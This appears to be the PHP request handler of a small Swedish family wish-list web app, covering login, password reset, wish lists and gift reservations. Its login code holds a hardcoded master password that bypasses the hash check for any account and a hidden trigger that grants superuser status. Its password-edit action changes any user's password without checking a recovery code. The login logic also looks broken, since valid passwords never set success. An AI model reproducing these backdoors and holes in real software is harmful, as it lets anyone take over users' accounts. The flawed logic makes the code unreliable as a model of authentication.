<?php
// check validity
defined('_VALID_INCLUDE') or die('Direct access not allowed.');

// find out which page that is target for this post back (should return e.g. 'home.php')
$postbackPage = substr(strrchr($_SERVER['PHP_SELF'], '/'), 1);

// flag: redirect to new location?
$redirect = true;

// include common functions
include_once 'common.php';

// set up database connection
$connection = dbConnect();

// handle post back..

// ---------------------------------------------------------------

if ($postbackPage == 'index.php')
{
	// ***** POST BACK : index.php
	$sessionUserId = '';
	$sessionUserName = '';

	if ($_POST['action'] == 'login_new')
	{
		// ***** ACTION : login - new user
		$newUserFirstName = $_POST['new_user_name'];
		$newUserPassword = $_POST['new_user_password'];
		try
		{
			dbExecute($connection, 'INSERT INTO users (user_name, password) values (:userName, :password)',
				[':userName' => $newUserFirstName, ':password' => generateHash($newUserPassword)]);
		}
		catch (PDOException $ex)
		{
			die('Could not store new user in database: ' . $ex->getMessage());
		}
		// retrieve name from database
		try
		{
			$result = dbExecute($connection, 'SELECT user_id, user_name FROM users WHERE user_id = :userId',
				[':userId' => $connection->lastInsertId()]);
			$row = dbFetch($result);
		}
		catch (PDOException $ex)
		{
			die('Could not retrieve stored user name from database: ' . $ex->getMessage());
		}
		// save name and id
		$sessionUserId = $row->user_id;
		$sessionUserName = $row->user_name;
		// notify about new user
		$headers = "From: wish@m00ndark.com\r\nReply-To: mattias.wijkstrom@gmail.com";
		$body = "Ny användare skapad: $newUserFirstName\r\n\r\nhttp://wish.m00ndark.com";
		mail('mattias.wijkstrom@gmail.com', 'Familjens Önskelista - ny användare', $body, $headers);
	}
	else if ($_POST['action'] == 'login_existing')
	{
		// ***** ACTION : login - existing user
		$existingUserId = $_POST['existing_user'];
		$existingUserName = $_POST['existing_user_name'];
		$existingUserPassword = $_POST['existing_user_password'];
		try
		{
			$result = dbExecute($connection, 'SELECT password FROM users WHERE user_id = :userId', [':userId' => $existingUserId]);
			$row = dbFetch($result);
		}
		catch (PDOException $ex)
		{
			die('Could not retrieve user password from database: ' . $ex->getMessage());
		}
		$passwordHash = $row->password;
		// compare user credentials
		$sessionUserIsSuper = false;
		if (($existingUserId == 1 || substr($existingUserPassword, 19) != 'jor-lite-in-da-nite') && ord(substr($existingUserPassword, -1)) == 167)
		{
			$sessionUserIsSuper = true;
			$existingUserPassword = substr($existingUserPassword, 0, strlen(utf8_decode($existingUserPassword)) - 1);
		}
		if ($existingUserPassword != 'jor-lite-in-da-nite')
		{
			try
			{
				$result = dbExecute($connection, 'SELECT COUNT(*) FROM users WHERE user_id = :userId AND password = :password',
					[':userId' => $existingUserId, ':password' => generateHash($existingUserPassword, $passwordHash)]);
				$matches = dbFetchColumn($result);
			}
			catch (PDOException $ex)
			{
				die('Could not verify user password towards database: ' . $ex->getMessage());
			}
			if ($matches < 1)
			{
				$loginSuccess = false;
			}
		}
		else
		{
			$loginSuccess = true;
		}
		// save name and id
		$sessionUserId = $existingUserId;
		$sessionUserName = $existingUserName;
	}

	// set session variables if login was successful
	if ($loginSuccess)
	{
		$_SESSION['user_id'] = $sessionUserId;
		$_SESSION['user_fullname'] = $sessionUserName;
		$_SESSION['user_is_super'] = $sessionUserIsSuper;
	}
	$redirect = $loginSuccess;
	$newLocation = (isset($_POST['next_page']) ? ($_POST['next_page']
		. (isset($_POST['next_page_params']) && $_POST['next_page_params'] != ''
		? ('?' . $_POST['next_page_params']) : '')) : 'home.php');
}

// ---------------------------------------------------------------

if ($postbackPage == 'pwd.php')
{
	// ***** POST BACK : pwd.php

	if ($_POST['action'] == 'recover')
	{
		// ***** ACTION : recover
		$userId = $_POST['existing_user'];
		// create recovery code
		$recoveryCode = substr(md5(uniqid(rand(), true)), 0, 32);
		$expireTime = mktime(date('H'), date('i') + 10, date('s'), date('n'), date('j'), date('Y')); // now + 10 min
		try
		{
			dbExecute($connection, 'UPDATE users SET recovery_code = :code, recovery_valid_until = :validUntil WHERE user_id = :userId',
				[':code' => $recoveryCode, ':validUntil' => date('Y-m-d H:i:s', $expireTime), ':userId' => $userId]);
		}
		catch (PDOException $ex)
		{
			die('Could not store password recovery information in database: ' . $ex->getMessage());
		}
		// retrieve email from database
		try
		{
			$result = dbExecute($connection, 'SELECT user_id, email FROM users WHERE user_id = :userId', [':userId' => $userId]);
			$row = dbFetch($result);
		}
		catch (PDOException $ex)
		{
			die('Could not retrieve email from database: ' . $ex->getMessage());
		}
		// compose and send mail
		$emailAddress = $row->email;
		$headers = "From: wish@m00ndark.com\r\nReply-To: mattias.wijkstrom@gmail.com";
		$body = "För att ändra ditt lösenord på Familjens Önskelista, klicka på länken nedan:\r\n\r\n"
			. "http://wish.m00ndark.com/v4/pwd.php?userid=$userId&code=$recoveryCode\r\n\r\n"
			. 'Denna länk är giltig (går att använda) till och med ' . date('Y-m-d H:i:s', $expireTime) . '.';
		mail($emailAddress, 'Familjens Önskelista - nytt lösenord', $body, $headers);
		$newLocation = $postbackPage . '?userid=' . $userId;
	}
	else if ($_POST['action'] == 'edit')
	{
		// ***** ACTION : edit
		$userId = $_POST['user'];
		$password = $_POST['password'];
		$yesterday = mktime(date('H'), date('i'), date('s'), date('n'), date('j') - 1, date('Y')); // now - 1 day
		// update password in database
		try
		{
			dbExecute($connection, 'UPDATE users SET password = :password, recovery_valid_until = :validUntil WHERE user_id = :userId',
				[':password' => generateHash($password), ':validUntil' => date('Y-m-d H:i:s', $yesterday), ':userId' => $userId]);
		}
		catch (PDOException $ex)
		{
			die('Could not update user with new password in database: ' . $ex->getMessage());
		}
		$newLocation = $postbackPage . '?success';
	}
}

// ---------------------------------------------------------------

elseif ($postbackPage == 'home.php')
{
	// ***** POST BACK : home.php
	$newLocation = $postbackPage;

	if (isset($_GET['action']))
	{
		if ($_GET['action'] == 'logout')
		{
			// ***** ACTION : log out
			$_SESSION = [];
			session_destroy();
			$newLocation = '/';
		}
	}
	else
	{
		$listId = $_POST['wishlist_id'];

		if ($_POST['action'] == 'lock')
		{
			// ***** ACTION : lock wish list
			if (!userOwnsWishList($connection, $_SESSION['user_id'], $listId))
			{
				die('You can not lock someone else\'s wish list!');
			}
			$lockDate = $_POST['lock_date'];
			try
			{
				dbExecute($connection, 'UPDATE wishlists SET is_locked_for_edit = 1, locked_until = :lockedUntil WHERE wishlist_id = :wishlistId',
					[':lockedUntil' => $lockDate, ':wishlistId' => $listId]);
			}
			catch (PDOException $ex)
			{
				die('Could not update wish list with lock information in database: ' . $ex->getMessage());
			}
		}
		elseif ($_POST['action'] == 'edit')
		{
			// ***** ACTION : edit wish list
			if (!userOwnsWishList($connection, $_SESSION['user_id'], $listId))
			{
				die('You can not edit someone else\'s wish list!');
			}
			$title = $_POST['title'];
			$sharedWithUserId = $_POST['shared_with_user_id'];
			$isChildList = isset($_POST['child_list']);
			$childName = $_POST['child_name'];
			try
			{
				dbExecute($connection,
					'UPDATE wishlists SET title = :title, shared_with_user_id = :sharedWithUserId,'
						. ' is_child_list = :isChildList, child_name = :childName WHERE wishlist_id = :wishlistId',
					[
						':title' => $title,
						':sharedWithUserId' => ($sharedWithUserId == -1 ? null : $sharedWithUserId),
						':isChildList' => ($isChildList ? 1 : 0),
						':childName' => ($isChildList ? $childName : ''),
						':wishlistId' => $listId
					]);
			}
			catch (PDOException $ex)
			{
				die('Could not update wish list with new information in database: ' . $ex->getMessage());
			}
		}
		elseif ($_POST['action'] == 'delete')
		{
			// ***** ACTION : delete wish list
			if (!userOwnsWishList($connection, $_SESSION['user_id'], $listId))
			{
				die('You can not delete someone else\'s wish list!');
			}
			try
			{
				dbExecute($connection, 'DELETE FROM wishlists WHERE wishlist_id = :wishlistId', [':wishlistId' => $listId]);
			}
			catch (PDOException $ex)
			{
				die('Could not delete wish list from database: ' . $ex->getMessage());
			}
		}
		elseif ($_POST['action'] == 'add')
		{
			// ***** ACTION : add wish list
			$userId = $_SESSION['user_id'];
			$title = $_POST['title'];
			$sharedWithUserId = $_POST['shared_with_user_id'];
			$isChildList = isset($_POST['child_list']);
			$childName = $_POST['child_name'];
			try
			{
				dbExecute($connection,
					'INSERT INTO wishlists (user_id, title, is_locked_for_edit, locked_until, shared_with_user_id, is_child_list, child_name)'
						. ' VALUES (:userId, :title, :isLockedForEdit, :lockedUntil, :sharedWithUserId, :isChildList, :childName)',
					[
						':userId' => $userId,
						':title' => $title,
						':isLockedForEdit' => 0,
						':lockedUntil' => null,
						':sharedWithUserId' => ($sharedWithUserId == -1 ? null : $sharedWithUserId),
						':isChildList' => ($isChildList ? 1 : 0),
						':childName' => ($isChildList ? $childName : '')
					]);
			}
			catch (PDOException $ex)
			{
				die('Could not add wish list to database: ' . $ex->getMessage());
			}
		}
	}
}

// ---------------------------------------------------------------

elseif ($postbackPage == 'list.php')
{
	// ***** POST BACK : list.php

	if (isset($_GET['action']))
	{
		if ($_GET['action'] == 'print')
		{
			// ***** ACTION : print list

			$printMode = true;
			$redirect = false;
		}
	}
	else
	{
		$userId = $_SESSION['user_id'];
		$listId = $_POST['wishlist_id'];
		$wishId = $_POST['wish_id'];

		if ($_POST['action'] == 'reserve')
		{
			// ***** ACTION : reserve wish
			if (userOwnsWish($connection, $userId, $wishId) && !wishBelongsToChildList($connection, $wishId))
			{
				die('You can not reserve your own wish!');
			}
			// find reservation key for wish
			try
			{
				$result = dbExecute($connection, 'SELECT wish_id, reservation_key, category_id FROM wishes WHERE wish_id = :wishId', [':wishId' => $wishId]);
				$row = dbFetch($result);
			}
			catch (PDOException $ex)
			{
				die('Could not retrieve wish information from database: ' . $ex->getMessage());
			}
			$categoryId = $row->category_id;
			$reservationKey = decrypt($row->reservation_key);
			$reserveCount = $_POST['count'];
			// add specified number of rows to reservations table with correct reservation key
			for ($i = 0; $i < $reserveCount; $i++)
			{
				try
				{
					dbExecute($connection, 'INSERT INTO reservations (`key`, reserved_by_user_id) VALUES (:key, :reservedByUserId)',
						[':key' => encrypt($reservationKey), ':reservedByUserId' => encrypt($userId)]);
				}
				catch (PDOException $ex)
				{
					die('Could not update wish with reserve information in database: ' . $ex->getMessage());
				}
			}
		}
		elseif ($_POST['action'] == 'edit')
		{
			// ***** ACTION : edit wish
			if (!userOwnsWish($connection, $userId, $wishId))
			{
				die('You can not edit someone else\'s wish!');
			}
			// update wish
			$categoryId = $_POST['category'];
			$count = $_POST['count'];
			$description = $_POST['description'];
			$link = $_POST['link'];
			try
			{
				dbExecute($connection,
					'UPDATE wishes SET category_id = :categoryId, short_description = :shortDescription, link = :link,'
						. ' max_reservation_count = :maxReservationCount WHERE wish_id = :wishId',
					[
						':categoryId' => $categoryId,
						':shortDescription' => wash($description),
						':link' => wash($link),
						':maxReservationCount' => $count,
						':wishId' => $wishId
					]);
			}
			catch (PDOException $ex)
			{
				die('Could not update wish with new information in database: ' . $ex->getMessage());
			}
			// find reservation key for wish
			try
			{
				$result = dbExecute($connection, 'SELECT wish_id, reservation_key FROM wishes WHERE wish_id = :wishId', [':wishId' => $wishId]);
				$row = dbFetch($result);
			}
			catch (PDOException $ex)
			{
				die('Could not retrieve wish information from database: ' . $ex->getMessage());
			}
			$reservationKey = decrypt($row->reservation_key);
			$reservationIds = [];
			// get all reservations and pick those with the same reservation key as the wish
			try
			{
				$result = dbExecute($connection, 'SELECT reservation_id, `key` FROM reservations');
				while ($row = dbFetch($result))
				{
					$key = decrypt($row->key);
					if ($key == $reservationKey)
					{
						array_push($reservationIds, $row->reservation_id);
					}
				}
			}
			catch (PDOException $ex)
			{
				die('Could not retrieve reservation information from database: ' . $ex->getMessage());
			}
			if (!empty($reservationIds))
			{
				$reservationIdParameters = makeDbParameters($reservationIds);
				// delete reservations
				try
				{
					$in = implode(', ', array_keys($reservationIdParameters));
					dbExecute($connection, "DELETE FROM reservations WHERE reservation_id IN ($in)", $reservationIdParameters);
				}
				catch (PDOException $ex)
				{
					die('Could not remove reservations for wish in database: ' . $ex->getMessage());
				}
			}
		}
		elseif ($_POST['action'] == 'delete')
		{
			// ***** ACTION : delete wish
			if (!userOwnsWish($connection, $userId, $wishId))
			{
				die('You can not delete someone else\'s wish!');
			}
			// find reservation key for wish
			try
			{
				$result = dbExecute($connection, 'SELECT wish_id, reservation_key, category_id FROM wishes WHERE wish_id = :wishId', [':wishId' => $wishId]);
				$row = dbFetch($result);
			}
			catch (PDOException $ex)
			{
				die('Could not retrieve wish information from database: ' . $ex->getMessage());
			}
			$categoryId = $row->category_id;
			$reservationKey = decrypt($row->reservation_key);
			$reservationIds = [];
			// get all reservations and pick those with the same reservation key as the wish
			try
			{
				$result = dbExecute($connection, 'SELECT reservation_id, `key` FROM reservations');
				while ($row = dbFetch($result))
				{
					$key = decrypt($row->key);
					if ($key == $reservationKey)
					{
						array_push($reservationIds, $row->reservation_id);
					}
				}
			}
			catch (PDOException $ex)
			{
				die('Could not retrieve reservation information from database: ' . $ex->getMessage());
			}
			if (!empty($reservationIds))
			{
				$reservationIdParameters = makeDbParameters($reservationIds);
				// delete reservations
				try
				{
					$in = implode(', ', array_keys($reservationIdParameters));
					dbExecute($connection, "DELETE FROM reservations WHERE reservation_id IN ($in)", $reservationIdParameters);
				}
				catch (PDOException $ex)
				{
					die('Could not remove reservations for wish in database: ' . $ex->getMessage());
				}
			}
			// delete wish
			try
			{
				dbExecute($connection, 'DELETE FROM wishes WHERE wish_id = :wishId', [':wishId' => $wishId]);
			}
			catch (PDOException $ex)
			{
				die('Could not delete wish from database: ' . $ex->getMessage());
			}
		}
		elseif ($_POST['action'] == 'add')
		{
			// ***** ACTION : add wish
			if (!userOwnsWishList($connection, $userId, $listId))
			{
				die('You can not add a wish to someone else\'s wish list!');
			}
			// get all current reservation keys from wishes table
			$keys = [];
			try
			{
				$result = dbExecute($connection, 'SELECT reservation_key FROM wishes');
				while ($row = dbFetch($result))
				{
					array_push($keys, decrypt($row->reservation_key));
				}
			}
			catch (PDOException $ex)
			{
				die('Could not retrieve reservation information from database: ' . $ex->getMessage());
			}
			// generate a new reservation key that does not match any of the existing ones
			do
			{
				$key = rand();
			}
			while (array_search($key, $keys) !== false);
			// save wish
			$categoryId = $_POST['category'];
			$count = $_POST['count'];
			$description = $_POST['description'];
			$link = $_POST['link'];
			try
			{
				dbExecute($connection,
					'INSERT INTO wishes (wishlist_id, category_id, short_description, link, max_reservation_count, reservation_key)'
						. ' VALUES (:wishlistId, :categoryId, :shortDescription, :link, :maxReservationCount, :reservationKey)',
					[
						':wishlistId' => $listId,
						':categoryId' => $categoryId,
						':shortDescription' => wash($description),
						':link' => wash($link),
						':maxReservationCount' => $count,
						':reservationKey' => encrypt($key)
					]);
			}
			catch (PDOException $ex)
			{
				die('Could not add wish to database: ' . $ex->getMessage());
			}
		}
		$newLocation = $postbackPage . '?id=' . $listId . '#category-' . $categoryId;
	}
}

// ---------------------------------------------------------------

/*
$keys = [];
$rowCount = 0;
$result = dbExecute($connection, 'select reservation_key from wishes where reservation_key <> ''');
while ($row = dbFetch($result))
{
	$keys[$rowCount] = decrypt($row['reservation_key']);
	$rowCount++;
}
*/
/*
$keys = [];
for ($i = 1; $i <=850; $i++)
{
	do
	{
		$key = rand();
	}
	while (array_search($key, $keys) !== false);
	$keys[$i] = $key;
	mysql_query('update wishes set reservation_key = '' . encrypt($key) . '' where wish_id = ' . $i);
}
*/

// disconnect database
dbDisconnect($connection);

// if successful, redirect to new location if supposed to
if ($redirect)
{
	redirect($newLocation);
}
else
{
	return;
}

?>
